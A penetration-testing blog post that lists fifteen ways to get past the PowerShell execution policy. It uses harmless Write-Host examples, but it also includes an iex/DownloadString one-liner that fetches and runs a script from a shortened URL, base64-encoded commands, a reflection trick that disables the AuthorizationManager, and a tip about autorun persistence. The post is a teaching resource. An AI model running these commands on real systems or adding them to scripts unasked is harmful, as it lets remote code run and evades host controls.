<p>By default PowerShell is configured to prevent the execution of PowerShell scripts on Windows systems. This can be a hurdle for penetration testers, sysadmins, and developers, but it doesn&#8217;t have to be. In this blog I&#8217;ll cover 15 ways to bypass the PowerShell execution policy without having local administrator rights on the system. I&#8217;m sure there are many techniques that I&#8217;ve missed (or simply don&#8217;t know about), but hopefully this cheat sheet will offer a good start for those who need it.</p>



<h3 class="wp-block-heading">What is the PowerShell Execution Policy?</h3>



<p>The PowerShell execution policy is the setting that determines which type of PowerShell scripts (if any) can be run on the system. By default it is set to &#8220;<a href="https://technet.microsoft.com/en-us/library/ee176961.aspx" target="_blank" rel="noopener noreferrer">Restricted</a>&#8220;, which basically means none. However, it&#8217;s important to understand that the setting was never meant to be a security control. Instead, it was intended to prevent administrators from shooting themselves in the foot. That&#8217;s why there are so many options for working around it. Including a few that Microsoft has provided. For more information on the execution policy settings and other default security controls in PowerShell I suggest reading <a href="https://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html" target="_blank" rel="noopener noreferrer">Carlos Perez&#8217;s blog</a>. He provides a nice overview.</p>



<h3 class="wp-block-heading">Why Would I Want to Bypass the Execution Policy?</h3>



<p>Automation seems to be one of the more common responses I hear from people, but below are a few other reasons PowerShell has become so popular with administrators, pentesters, and hackers. PowerShell is:</p>



<ul class="wp-block-list">
<li>Native to Windows</li>



<li>Able to call the Windows API</li>



<li>Able to run commands without writing to the disk</li>



<li>Able to avoid detection by Anti-virus</li>



<li>Already flagged as &#8220;trusted&#8221; by most application white list solutions</li>



<li>A medium used to write many <a href="https://www.netspi.com/open-source-tools/" target="_blank" rel="noreferrer noopener">open source pentest toolkits</a></li>
</ul>



<h3 class="wp-block-heading">How to View the Execution Policy</h3>



<p>Before being able to use all of the wonderful features PowerShell has to offer, attackers may have to bypass the &#8220;Restricted&#8221; execution policy. You can take a look at the current configuration with the &#8220;Get-ExectionPolicy&#8221; PowerShell command. If you&#8217;re looking at the setting for the first time it&#8217;s likely set to &#8220;Restricted&#8221; as shown below.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PS C:> Get-ExecutionPolicy</pre>



<figure class="wp-block-image size-full is-style-default"><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_1.png"><img decoding="async" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_1.png" alt="Administrator: Windows Powershell" class="wp-image-7150"/></a></figure>



<p>It&#8217;s also worth noting that the execution policy can be set at different levels on the system. To view a list of them use the command below. For more information you can check out Microsoft&#8217;s &#8220;Set-ExecutionPolicy&#8221; page <a href="https://technet.microsoft.com/en-us/library/hh849812.aspx" target="_blank" rel="noreferrer noopener">here</a>.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Get-ExecutionPolicy -List | Format-Table -AutoSize</pre>

<p>In the examples below I will use a script named runme.ps1 that contains the following PowerShell command to write a message to the console:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="powershell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Write-Host "My voice is my passport, verify me."</pre>



<p>When I attempt to execute it on a system configured with the default execution policy I get the following error: <a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_3.png"><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-7152" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_3.png" alt="Powershell Bypass - Set-ExecutionPolicy Restricted" width="854" height="268"></a></p>



<p>If your current policy is too open and you want to make it more restrictive to test the techniques below, then run the command &#8220;Set-ExecutionPolicy Restricted&#8221; from an administrator PowerShell console. Ok &#8211; enough of my babbling &#8211; below are 15 ways to bypass the PowerShell execution policy restrictions.</p>



<h3 class="wp-block-heading">Bypassing the PowerShell Execution Policy</h3>


<h4>1. Paste the Script into an Interactive PowerShell Console</h4>


<p>Copy and paste your PowerShell script into an interactive console as shown below. However, keep in mind that you will be limited by your current user&#8217;s privileges. This is the most basic example and can be handy for running quick scripts when you have an interactive console. Also, this technique does not result in a configuration change or require writing to disk.</p>



<figure class="wp-block-image size-full is-style-default"><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_4.png"><img decoding="async" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_4.png" alt="Interactive PowerShell Console" class="wp-image-7153"/></a></figure>



<h4 class="wp-block-heading">2. Echo the Script and Pipe it to PowerShell Standard In</h4>



<p><span style="font-size: inherit;color: inherit">Simply ECHO your script into PowerShell standard input. This technique does not result in a configuration change or require writing to disk.</span></p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Echo Write-Host "My voice is my passport, verify me." | PowerShell.exe -noprofile -</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_5.png"><img decoding="async" class="alignnone size-full wp-image-7154" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_5.png" alt="Powershell Bypass - Script Echo" width="894" height="245"></a></figure>


<h4 class="wp-block-heading">3. Read Script from a File and Pipe to PowerShell Standard In</h4>



<p>Use the Windows &#8220;type&#8221; command or PowerShell &#8220;Get-Content&#8221; command to read your script from the disk and pipe it into PowerShell standard input. This technique does not result in a configuration change, but does require writing your script to disk. However, you could read it from a network share if you&#8217;re trying to avoid writing to the disk.</p>


<p><em>Example 1: Get-Content PowerShell command</em></p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Get-Content .runme.ps1 | PowerShell.exe -noprofile -</pre>


<p><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_6.png"><img decoding="async" class="alignnone size-full wp-image-7156" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_6.png" alt="Powershell Bypass - Get-Content Command" width="854" height="236"></a></p>
<p><em>Example 2: Type command</em></p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">TYPE .runme.ps1 | PowerShell.exe -noprofile -</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_7.png"><img decoding="async" class="alignnone size-full wp-image-7157" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_7.png" alt="Powershell Bypass - Type command" width="854" height="236"></a></figure>


<h4 class="wp-block-heading">4. Download Script from URL and Execute with Invoke Expression</h4>



<p>This technique can be used to download a PowerShell script from the internet and execute it without having to write to disk. It also doesn&#8217;t result in any configuration changes. I have seen it used in many creative ways, but most recently saw it being referenced in a nice PowerSploit blog by Matt Graeber.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://bit.ly/1kEgbuH')"</pre>



<figure class="wp-block-image size-full is-style-default"><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_8.png"><img decoding="async" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_8.png" alt="Powershell Bypass - Execute with Invoke Expression" class="wp-image-7158"/></a></figure>



<h4 class="wp-block-heading">5. Use the Command Switch</h4>



<p><span style="font-size: inherit;color: inherit">This technique is very similar to executing a script via copy and paste, but it can be done without the interactive console. It&#8217;s nice for simple script execution, but more complex scripts usually end up with parsing errors. This technique does not result in a configuration change or require writing to disk.</span></p>


<p><em>Example 1: Full command</em></p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Powershell -command "Write-Host 'My voice is my passport, verify me.'"</pre>


<p><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_9.png"><img decoding="async" class="alignnone size-full wp-image-7159" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_9.png" alt="Powershell Bypass - Command Switch" width="854" height="236"></a></p>
<p><em>Example 2: Short command</em></p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Powershell -c "Write-Host 'My voice is my passport, verify me.'"</pre>


<p>It may also be worth noting that you can place these types of PowerShell commands into batch files and place them into autorun locations (like the all users startup folder) to help during privilege escalation.</p>


<h4 class="wp-block-heading">6. Use the EncodeCommand Switch</h4>


<p>This is very similar to the &#8220;Command&#8221; switch, but all scripts are provided as a Unicode/base64 encoded string. Encoding your script in this way helps to avoid all those nasty parsing errors that you run into when using the &#8220;Command&#8221; switch. This technique does not result in a configuration change or require writing to disk. The sample below was taken from Posh-SecMod. The same toolkit includes a nice little compression method for reducing the size of the encoded commands if they start getting too long.</p>


<p><em style="font-size: inherit">Example 1: Full command</em></p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">$command = "Write-Host 'My voice is my passport, verify me.'" 
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
$encodedCommand = [Convert]::ToBase64String($bytes) 
powershell.exe -EncodedCommand $encodedCommand</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_10.png"><img decoding="async" class="alignnone size-full wp-image-7160" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_10.png" alt="Powershell Bypass - EncodeCommand Switch" width="854" height="268"></a></figure>


<p><em>Example 2: Short command</em> using encoded string</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">powershell.exe -Enc VwByAGkAdABlAC0ASABvAHMAdAAgACcATQB5ACAAdgBvAGkAYwBlACAAaQBzACAAbQB5ACAAcABhAHMAcwBwAG8AcgB0ACwAIAB2AGUAcgBpAGYAeQAgAG0AZQAuACcA</pre>



<h4 class="wp-block-heading">7. Use the Invoke-Command Command</h4>



<p>This is a fun option that I came across on the Obscuresec blog. It’s typically executed through an interactive PowerShell console or one liner using the “Command” switch, but the cool thing is that it can be used to execute commands against remote systems where PowerShell remoting has been enabled. This technique does not result in a configuration change or require writing to disk.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}</pre>



<figure class="wp-block-image size-full is-style-default"><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_11.png"><img decoding="async" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_12.png" alt="Powershell Bypass - Invoke-Command Command" class="wp-image-7162"/></a></figure>



<p>Based on the Obscuresec blog, the command below can also be used to grab the execution policy from a remote computer and apply it to the local computer.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">invoke-command -computername Server01 -scriptblock {get-executionpolicy} | set-executionpolicy -force</pre>



<h4 class="wp-block-heading">8. Use the Invoke-Expression Command</h4>



<p><span style="font-size: inherit">This is another one that&#8217;s typically executed through an interactive PowerShell console or one liner using the &#8220;Command&#8221; switch. This technique does not result in a configuration change or require writing to disk. Below I&#8217;ve listed are a few common ways to use Invoke-Expression to bypass the execution policy.</span> </p>



<p><em style="font-size: inherit">Example 1: Full command using Get-Content</em></p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Get-Content .runme.ps1 | Invoke-Expression</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_12.png"><img decoding="async" class="alignnone size-full wp-image-7162" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_12.png" alt="Powershell Bypass - Invoke-Expression Command" width="854" height="268"></a></figure>


<p><em style="font-size: inherit">Example 2: Short command using Get-Content</em></p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">GC .runme.ps1 | iex</pre>



<h4 class="wp-block-heading">9. Use the &#8220;Bypass&#8221; Execution Policy Flag</h4>



<p>This is a nice flag added by Microsoft that will bypass the execution policy when you&#8217;re executing scripts from a file. When this flag is used Microsoft states that &#8220;Nothing is blocked and there are no warnings or prompts&#8221;. This technique does not result in a configuration change or require writing to disk.</p>



<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_13.png"><img decoding="async" class="alignnone size-full wp-image-7163" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_13.png" alt="ExecutionPolicy Bypass" width="854" height="268"></a></figure>


<h4 class="wp-block-heading">10. Use the &#8220;Unrestricted&#8221; Execution Policy Flag</h4>


<p>This similar to the &#8220;Bypass&#8221; flag. However, when this flag is used Microsoft states that it &#8220;Loads all configuration files and runs all scripts. If you run an unsigned script that was downloaded from the Internet, you are prompted for permission before it runs.&#8221; This technique does not result in a configuration change or require writing to disk.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PowerShell.exe -ExecutionPolicy UnRestricted -File .runme.ps1</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_14.png"><img decoding="async" class="alignnone size-full wp-image-7164" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_14.png" alt="Powershell Bypass - Swap out the AuthorizationManager" width="854" height="268"></a></figure>


<h4 class="wp-block-heading">11. Use the &#8220;Remote-Signed&#8221; Execution Policy Flag</h4>


<p>Create your script then follow the tutorial <a href="https://www.darkoperator.com/blog/2013/3/5/powershell-basics-execution-policy-part-1.html" target="_blank" rel="noopener noreferrer">written by Carlos Perez</a> to sign it. Finally,run it using the command below:</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1</pre>



<h4 class="wp-block-heading">12. Disable ExecutionPolicy by Swapping out the AuthorizationManager</h4>


<p>This is one of the more creative approaches. The function below can be executed via an interactive PowerShell console or by using the &#8220;command&#8221; switch. Once the function is called it will swap out the &#8220;AuthorizationManager&#8221; with null. As a result, the execution policy is essentially set to unrestricted for the remainder of the session. This technique does not result in a persistant configuration change or require writing to disk. However, it the change will be applied for the duration of the session.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} 

Disable-ExecutionPolicy  .runme.ps1</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_15.png"><img decoding="async" class="alignnone size-full wp-image-7165" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_15.png" alt="Powershell Bypass - Process Scope" width="854" height="268"></a></figure>


<h4 class="wp-block-heading">13. Set the ExcutionPolicy for the Process Scope</h4>


<p>As we saw in the introduction, the execution policy can be applied at many levels. This includes the process which you have control over. Using this technique the execution policy can be set to unrestricted for the duration of your Session. Also, it does not result in a configuration change, or require writing to the disk.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Set-ExecutionPolicy Bypass -Scope Process</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_16.png"><img decoding="async" class="alignnone size-full wp-image-7166" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_16.png" alt="Powershell Bypass - Set the ExcutionPolicy" width="824" height="285"></a></figure>


<h4 class="wp-block-heading">14. Set the ExcutionPolicy for the CurrentUser Scope via Command</h4>


<p>This option is similar to the process scope, but applies the setting to the current user&#8217;s environment persistently by modifying a registry key. Also, it does not result in a configuration change, or require writing to the disk.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_17.png"><img decoding="async" class="alignnone size-full wp-image-7167" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_17.png" alt="CurrentUser Scope via the" width="854" height="300"></a></figure>


<h4 class="wp-block-heading">15. Set the ExcutionPolicy for the CurrentUser Scope via the Registry</h4>


<p>In this example I&#8217;ve shown how to change the execution policy for the current user&#8217;s environment persistently by modifying a registry key directly.</p>


<pre class="EnlighterJSRAW" data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">HKEY_CURRENT_USERSoftwareMicrosoftPowerShell1ShellIdsMicrosoft.PowerShell</pre>


<figure><a href="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_18.png"><img decoding="async" class="alignnone size-full wp-image-7168" src="https://www.netspi.com/wp-content/uploads/2014/09/Powershell_Bypass_18.png" alt="Powershell Bypass – Folder Structure" width="784" height="382"></a></figure>


<h3 class="wp-block-heading">Wrap Up Summary</h3>



<p>I think the theme here is that the execution policy doesn’t have to be a hurdle for developers, admins, or&nbsp;<a href="https://www.netspi.com/penetration-testing-services/" target="_blank" rel="noreferrer noopener">penetration testing</a>. Microsoft never intended it to be a security control. Which is why there are so many options for bypassing it. Microsoft was nice enough to provide some native options and the security community has also come up with some really fun tricks. Thanks to all of those people who have contributed through blogs and presentations. To the rest, good luck in all your PowerShell adventures and don&#8217;t forget to hack responsibly. 😉</p>
